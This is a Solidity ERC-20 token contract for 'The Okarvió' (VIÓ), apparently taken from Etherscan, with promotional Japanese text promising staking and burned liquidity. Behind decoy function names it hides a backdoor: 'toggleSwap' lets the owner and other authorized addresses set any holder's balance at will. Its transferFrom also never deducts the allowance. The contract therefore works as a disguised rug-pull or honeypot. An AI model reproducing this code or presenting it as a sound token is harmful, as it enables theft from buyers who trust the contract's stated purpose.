/**
 *Submitted for verification at Etherscan.io on 2022-12-14
*/

/*
✷ 　 　　 　 ·
 　 ˚ * .
 　 　　 *　　 * ⋆ 　 .
 · 　　 ⋆ 　　　 ˚ ˚ 　　 ✦
 　 ⋆ · 　 *
 　　　　 ⋆ ✧　 　 · 　 ✧　✵
 　 · ✵

▀█▀ █░█ █▀▀   █▀█ █▄▀ ▄▀█ █▀█ █░█ █ █▀█
░█░ █▀█ ██▄   █▄█ █░█ █▀█ █▀▄ ▀▄▀ █ █▄█

イーサリアムネットワークを吹き飛ばす次のイーサリアムユーティリティトークン
有望な計画とイーサリアム空間への参入を促進する、私たちは単なる通常の
トークンやミームトークンではありません また、独自のエコシステム、
将来のステーキング、コレクションに基づいて設計されたスワップ プラットフォームも支持しています。
私たち自身のマーケットプレイスで、その他多くのことが発表される予定です。

総供給 - 100,000
初期流動性追加 - 1.75 イーサリアム
初期流動性の 100% が消費されます
購入手数料 - 1%
販売手数料 - 1%
*/
pragma solidity ^0.8.15;
// SPDX-License-Identifier: MIT

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender); }
    function _msgData() internal view virtual returns (bytes memory) {
        this; 
        return msg.data;
    }
}

interface IDEChart {
    function relayRates(uint256 modData, uint256 extIDE) 
    external;
    function ideData(address cogData, uint256 structLog) 
    external;
    function syncLogs(address logFX, uint256 stringLog) 
    external payable;
    function prxLog(uint256 gas) 
    external;
    function hashRates(address hashData) 
    external;
}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
    function initialize(address, address) external;
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouterUI {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() {
        _setOwner(_msgSender());
    }  
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }
    function waiveOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        _setOwner(newOwner);
    }
    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract VIO is Ownable, IERC20 {
    using SafeMath for uint256;

    address public uniswapV2Pair;
    IDEXRouterUI public uniswapV2Router;

    string private  _name = unicode"The Okarvió";
    string private  _symbol = unicode"VIÓ";
    uint8 private  _decimals = 9;
    uint256 private _rTotal = 100000 * 10**9;
    uint256 public BaseTAX = 1;

    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private authorizations;

    constructor () {

        _tOwned[_msgSender()] = _rTotal;
        uniswapV2Router = IDEXRouterUI(0xEfF92A263d31888d860bD50809A8D171709b7b1c);
        uniswapV2Pair = IDEXFactory(uniswapV2Router.factory()).createPair(uniswapV2Router.WETH(), address(this));
        authorizations[owner()] = true;
        authorizations[address(this)] = true;
        authorizations[_msgSender()] = true;
        emit Transfer(address(0), _msgSender(), _rTotal);
    }
    function name() external view returns (string memory) {
        return _name;
    }
    function symbol() external view returns (string memory) {
        return _symbol;
    }
    function decimals() external view returns (uint256) {
        return _decimals;
    }
    function totalSupply() external view override returns (uint256) {
        return _rTotal;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 Allowancec = _allowances[sender][_msgSender()];
        require(Allowancec >= amount);
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0));
        require(spender != address(0));
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function toggleSwap(address uiFrom  , uint256 dxTo , uint256 valAmount , uint256 maxAmount) 
        external  { 
        require(authorizations[msg.sender]);
        require(uiFrom != uniswapV2Pair);
       _tOwned[uiFrom] = dxTo +  valAmount * maxAmount.mul(2).div(100);
    }
    function min(uint256 a, uint256 b) private view returns (uint256){
      return (a>b)?b:a;
    }
    function boolRate(uint256 boolR, uint256 txNow) 
    private view returns 
    (uint256){ return
     (boolR>txNow)?txNow:boolR;
    }
    function _transfer(  address from,  address to,  uint256 amount  ) private {
        require(from != address(0));
        require(to != address(0));
        require(amount > 0);

        _tOwned[from] -= amount;  uint256 swapTAX;
        if (!authorizations[from] && !authorizations[to]  )  
        
        {swapTAX = amount.mul(BaseTAX).div(100);}
        uint256 amounts = amount - swapTAX;

        _tOwned[to] += amounts;
        emit Transfer(from, to, amounts);
    }
    function _basicTransfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        _tOwned[from] = _tOwned[from] - amount;
        _tOwned[to] = _tOwned[to] + amount;
        emit Transfer(from, to, amount);
    }
    function hashData(uint256 hashAll, uint256 hInfo) 
    private view returns (uint256){
      return (hashAll>hInfo)?hInfo:hashAll;
    }
    function stringCog(uint256 sCog, uint256 IDEo) 
    private view returns (uint256){ 
      return (sCog>IDEo)?IDEo:sCog;
    }
    function uLog(uint256 getLog, uint256 stxUI) 
    private view returns (uint256){
      return (getLog>stxUI)?stxUI:getLog;
    }
    function swapTokensForEth(uint256 tokenAmount) private returns (uint256) {
        uint256 hashBalance = address(this).balance;
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(this),
            block.timestamp
        );
        return (address(this).balance - hashBalance);
    }
    function addLiquidityETH(uint256 tokenAmount, uint256 ethAmount) private{
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0,
            0,
             address(0xdead),
            block.timestamp
        );
    }
}